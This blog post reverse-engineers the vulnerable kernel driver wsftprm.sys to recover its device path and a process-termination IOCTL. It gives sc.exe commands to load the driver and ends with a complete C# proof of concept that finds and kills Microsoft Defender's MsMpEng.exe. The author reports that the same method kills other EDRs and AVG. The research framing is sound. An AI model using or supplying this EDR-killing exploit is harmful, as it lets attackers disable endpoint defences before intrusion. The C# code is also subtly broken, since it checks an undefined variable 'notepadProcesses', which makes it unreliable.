---
title: Vulnerable Drivers - Revisited
date: 2025-12-12T19:52:50+00:00
slug: vulnerable-drivers-revisited
draft: false
description: "In this post, I'll explore exploiting another driver: wsftprm.sys, but this time I've only given myself the target and no additional information in order to learn the enumeration and discovery techniques to approach driver N-day research."
cover:
  image: /images/2025/12/Gemini_Generated_Image_2kj3ap2kj3ap2kj3.png
  relative: false
  hiddenInList: false
tag:
  - driver
  - "2025"
  - Windows
  - binary ninja
---

I came across another vulnerable driver while browsing my feed the other day. Following my research last year, I was curious how much of the methodology can be carried over.

{{< bookmark
  url="https://westsideelectronics.com/vulnerable-drivers/"
  title="Vulnerable Drivers"
  description="In this post I dive into the reverse engineering and abuse of vulnerable kernel drivers and how they are used to kill defensive solutions such as EDRs and AVs, using the example of aswArPot.sys, an anti-rootkit driver from Avast."
  favicon="/images/icon/favicon-3.ico"
  thumbnail="/images/thumbnail/Screenshot-2024-12-14-170629.png"
  site="West Side Electronics"
  author="Benjamen Lim">}}

The original research was conducted by Northwave Cyber Security:
{{< bookmark
  url="https://northwave-cybersecurity.com/blackoutreloaded-exploiting-antifraud-software-of-banks-to-kill-microsoft-defender"
  title="Blackout"
  description="Reloaded: Exploiting antifraud software of banks to kill Microsoft DefenderBlackoutReloaded: Exploiting antifraud software of banks to kill Microsoft Defender"
  favicon="/images/icon/NW-Icon-1.png"
  thumbnail="/images/thumbnail/SOC-CMM-1-1.png"
  site="Northwave Cyber Security">}}
This time I've only given myself the name of the driver to start with, and I'm using Binary Ninja instead of Ghidra to explore other reverse engineering tools.

# Discovery

Dropping the driver into Binary Ninja was painless. It immediately placed me at the start of the driver.

![](/images/2025/12/image-9.png)

There are only two major functions: the first one is used to set up the stack cookie, which is not important to my goals so I jumped into the next function. It takes in the driver object and registry path.

![](/images/2025/12/image-10.png)

In this function, I explored the functions where the driver object is passed in as an argument, and eventually landed on a promising function that I decided to call `initDriver`.

{{< figure src="/images/2025/12/image-13.png" alt="" caption="InitDriver function" >}}

## Finding the File Path

One of the things to find is the file path which we need to call the driver from. In the `initDriver` function I noticed two strings being populated from two functions that I renamed to `decodePath32()` and `decodepath64()`.

In the functions, I noticed a similar structure which looked like a decryption routine.

![](/images/2025/12/image-1.png)

![](/images/2025/12/image-2.png)

After some quick analysis, these two decryption functions return `\Device\Warsaw_PM` and `\DosDevices\Warsaw_PPM`. The first is for a x64 system, while the latter is for a 32-bit system. This is the file handle that the user-land process will need to call in order to interact with the driver.

The blog post from Northwave Cyber Security also confirms this.

![](/images/2025/12/image-11.png)

These strings are used to create the device. Note to self - it may be faster to look for `IoCreateDevice` in the future to quickly navigate to the actual function of interest.

![](/images/2025/12/image-3.png)

Now that I have found the file path to get a handle to the driver, I will need to discover the vulnerable IOCTL control code.

## Looking for IOCTLs

I fouind the offset from the driver object to the `MajorFunction (0x70)` and a further offset of  `IRP_MJ_DEVICE_CONTROL (0xe)` which interprets IOCTL codes.

![](/images/2025/12/image-4.png)

Diving into the function, I needed to identify where the function is resolving the `CurrentStackLocation`, which stores the references to the input and output buffers.

Using Windbg, it shows that `CurrentStackLocation` is at offset `0x40` from `IRP->Tail`.

```
0:007> dt nt!_IRP -r2
...
+0x078 Tail             : <unnamed-tag>
      +0x000 Overlay          : <unnamed-tag>
         +0x000 DeviceQueueEntry : _KDEVICE_QUEUE_ENTRY
         +0x000 DriverContext    : [4] Ptr64 Void
         +0x020 Thread           : Ptr64 _ETHREAD
         +0x028 AuxiliaryBuffer  : Ptr64 Char
         +0x030 ListEntry        : _LIST_ENTRY
         +0x040 CurrentStackLocation : Ptr64 _IO_STACK_LOCATION
         +0x040 PacketType       : Uint4B
         +0x048 OriginalFileObject : Ptr64 _FILE_OBJECT
         +0x050 IrpExtension     : Ptr64 Void
```

Some searching around shows that this offset is a pointer to an `IO_STACK_LOCATION` struct. We are interested in this field because using WinDBG shows that this is where the user buffers are potentially stored:

```
0:007> dt nt!_IO_STACK_LOCATION -r2
ntdll!_IO_STACK_LOCATION
   +0x000 MajorFunction    : UChar
   +0x001 MinorFunction    : UChar
   +0x002 Flags            : UChar
   +0x003 Control          : UChar
   +0x008 Parameters       : <unnamed-tag>
   ...
     +0x000 DeviceIoControl  : <unnamed-tag>
             +0x000 OutputBufferLength : Uint4B
             +0x008 InputBufferLength : Uint4B
             +0x010 IoControlCode    : Uint4B
             +0x018 Type3InputBuffer : Ptr64 Void
```

This corresponds to previous work as well.

![](/images/2025/12/image-13-1.png)

![](/images/2025/12/image-5.png)

I found an interesting function with an IOCTL code of `0x22201c` . This function also checks that the input buffer's size is `0x40c`. Binary Ninja has associated the IRP offset with `MasterIrp` in the decompilation process , but in this case, since I can see that it is loading a buffer into memory, and the same offset can also be interpreted as `SystemBuffer`, I will change it to `SystemBuffer`.

{{< figure src="/images/2025/12/image-6.png" alt="" caption="Original decompiled process" >}}

The next function to be called is `sub_14000264c` which is interesting because it takes in the buffer that was loaded as well as a variable that is always `False`. I have renamed this function as `preCheckTerminate`.

![](/images/2025/12/image-7.png)

Since we know that `arg2` is always false, the if statement is skipped. I followed the flow to the next function `sub_140002848`, which takes in the buffer.

![](/images/2025/12/image-8.png)

Success! This function calls `ZwOpenProcess` and `ZwTerminateProcess`. It appears that the buffer passes to `ZwTerminateProcess` a `clientId`. This is a struct that has the process's PID as well as optionally a thread ID.

![](/images/2025/12/image-12.png)

This opens a handle to the process which is passed to `ZwTerminateProcess` to be terminated.

So now we have all the details to write the POC:

- File path to call the driver
- IOCTL to supply to the driver
- Buffer to supply to the driver

# POC

The driver can be downloaded from the following LOLDrivers.
{{< bookmark
  url="https://www.loldrivers.io/drivers/30e8d598-2c60-49e4-953b-a6f620da1371/?query=wsf"
  title="30e8d598-2c60-49e4-953b-a6f620da1371wsftprm.sys Description Northwave Cyber Security contributed this driver based on in-house research. The driver has a CVSSv3 score of 6.1, indicating a antivirus killer impact. This vulnerability could potentially be exploited for privilege escalation or other malicious activities. UUID: 30e8d598-2c60-49e4-953b-a6f620da1371 Created: 2024-09-11 Author: Northwave Cyber Security Acknowledgement: Northwave Cyber Security | Download"
  description="Block Commands sc.exe create wsftprm binPath=C:\windows\temp\wsftprm.sys type=kernel &amp;&amp; sc.exe start wsftprm Use Case Privileges Operating System Elevate privileges kernel Windows 10 Detections YARA 🏹 Expand Sigma 🛡️ Expand Names"
  favicon="/images/icon/apple-touch-icon-1.png"
  thumbnail="/images/thumbnail/logo-1.png"
  site="LOLDrivers"
>}}
I will use the same code from my previous to call the driver with some minor modifications. Since the only check is the buffer size, I made a small modification to the code which can be found in the code section below.

The driver is installed using the following commands:

```
sc.exe create wsftprm binPath=C:\windows\temp\wsftprm.sys type=kernel 
sc.exe start wsftprm
```

Using `accesschk`, I see that anyone can access this device.

![](/images/2025/12/image-15.png)

Calling the driver from my user-land process allows me to kill Microsoft Defender and other EDRs. 😄

{{< figure src="/images/2025/12/Screenshot-2025-12-09-002517.png" alt="" caption="Defender" >}}

{{< figure src="/images/2025/12/Screenshot-2025-12-09-225946.png" alt="" caption="Other EDRs" >}}

## Driver Blocklists don't always work

Previously I believed that all potentially malicious drivers will be blocked as I had to disable the AVG driver blocklist for the driver exploit to work. However in this case, it had minimal detection by VirusTotal, which might indicate that it is not being actively exploited in the wild.

![](/images/2025/12/Screenshot-2025-12-13-041513.png)

I installed AVG's Antivirus with the defaults (Driver blocklist active), and it did not block the installation of the driver. Running my exploit only triggered a scan that ultimately did not block it, and I was able to kill AVG as well.

![](/images/2025/12/Screenshot-2025-12-13-060532.png)

## Different code in Northwave Cybersecurity?

Interestingly, if I updated my code to match Northwave's code, specifically the buffer size allocated to the input buffer `0x30c * 8`, my code fails.

![](/images/2025/12/image-14.png)

This is expected because the driver has an explicit check. I thought it was odd how Northwave managed to get it to work, however this may be how their code was implemented.

# C# Code

```csharp
using System;
using System.Diagnostics;
using System.Linq;
using System.Runtime.InteropServices;

namespace MalDriverCaller
{
    internal class Program
    {
        [DllImport("kernel32.dll", SetLastError = true)]
        private static extern bool DeviceIoControl(
                IntPtr hDevice,
                uint dwIoControlCode,
                IntPtr lpInBuffer,
                uint nInBufferSize,
                IntPtr lpOutBuffer,
                uint nOutBufferSize,
                out uint lpBytesReturned,
                IntPtr lpOverlapped);

        [DllImport("kernel32.dll", SetLastError = true)]
        private static extern IntPtr CreateFile(
            string lpFileName,
            uint dwDesiredAccess,
            uint dwShareMode,
            IntPtr lpSecurityAttributes,
            uint dwCreationDisposition,
            uint dwFlagsAndAttributes,
            IntPtr hTemplateFile
        );

        static void Main(string[] args)
        {
            // get handle to the registered driver

            string driverPath = "\\\\.\\Warsaw_PM";
            IntPtr driverHandle = CreateFile(
                driverPath,
                0xC0000000,
                0x00000000,
                IntPtr.Zero,
                0x3,        // OPEN_EXISTING
                0x80,        
                IntPtr.Zero);
            if ((int)driverHandle == -1)
            {
                Console.WriteLine("[!] handle not found! Exiting");
                return;
            }
            else
            {
                Console.WriteLine($"[+] Handle for driver found at {driverHandle}");
            }
            // find all pids
            var allProcesses = Process.GetProcesses();

            // Filter the processes to find those named "MsMpEng.exe"
            var defenderProcesses = allProcesses
                .Where(p => string.Equals(p.ProcessName, "MsMpEng", StringComparison.OrdinalIgnoreCase))
                .ToList();

            if (notepadProcesses.Any())
            {
                Console.WriteLine($"[+] Found {defenderProcesses.Count} instance(s) of Windows Defender:");

                foreach (var process in defenderProcesses)
                {
                    Console.WriteLine($"[+] Process ID: {process.Id}, Name: {process.ProcessName}, Window Title: {process.MainWindowTitle}");

                    // Communicate with the driver using DeviceIoControl
                    int[] pid = new int[1];
                    pid[0] = process.Id;
                    uint ioctlCode = 0x22201c;  // IOCTL code

                    IntPtr inBufferPtr = Marshal.AllocHGlobal(0x40c);

                    Marshal.Copy(pid, 0, inBufferPtr, 1);
                    uint inBufferSize = 0x40c;         // Input buffer size (bytes)
                    IntPtr outBuffer = IntPtr.Zero; // NULL
                    uint outBufferSize = 0;     // no size
                    uint bytesReturned;
                    Console.WriteLine($"[i] Calling driver on {process.Id} at {inBufferPtr}");
                    bool result = DeviceIoControl(
                        driverHandle,
                        ioctlCode,
                        inBufferPtr,
                        inBufferSize,
                        outBuffer,
                        outBufferSize,
                        out bytesReturned,
                        IntPtr.Zero);

                    if (result)
                    {
                        Console.WriteLine($"[+] DeviceIoControl succeeded, bytes returned: {bytesReturned}, kill confirmed.");
                    }
                    else
                    {
                        Console.WriteLine("[-] DeviceIoControl failed. :(");
                    }
                    Marshal.FreeHGlobal( inBufferPtr );

                }
            }
            else
            {
                Console.WriteLine("[i] No instances of MsMpEng.exe found.");
            }
        }
    }
}

```

# References

[https://medium.com/@matterpreter/methodology-for-static-reverse-engineering-of-windows-kernel-drivers-3115b2efed83](https://medium.com/@matterpreter/methodology-for-static-reverse-engineering-of-windows-kernel-drivers-3115b2efed83)
{{< bookmark
  url="https://v1k1ngfr.github.io/pimp-my-pid/#communication-flow--from-user-land-to-kernel-land"
  title="Pimp my PID - get SYSTEM using Windows kernel"
  description="During my journey into the Windows Kernel I found interesting to create a tool to elevate any process to SYSTEM using a driver. Here are some details about that."
  favicon="/images/icon/apple-icon-180x180-1.png"
  thumbnail="/images/thumbnail/pimpmypid.png"
  site="Viking"
  author="Viking"
>}}
